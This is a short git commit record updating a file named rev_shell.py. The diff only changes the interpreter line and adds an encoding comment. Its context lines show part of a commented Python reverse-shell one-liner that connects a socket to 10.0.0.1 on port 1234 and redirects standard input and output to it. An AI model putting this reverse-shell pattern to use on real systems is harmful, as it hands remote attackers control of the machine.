de8e65abde1e75ed40a076a825919ea2d3075b46
Pawel Cygal <pawel.cygal@poczta.fm>
2019-10-26 21:35:42 +0200

    Update rev_shell.py

--- rev_shell.py
+++ rev_shell.py
@@ -1,4 +1,5 @@
-#!/usr/local/bin/python
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
 # one liner example:
 # python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
 #           s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
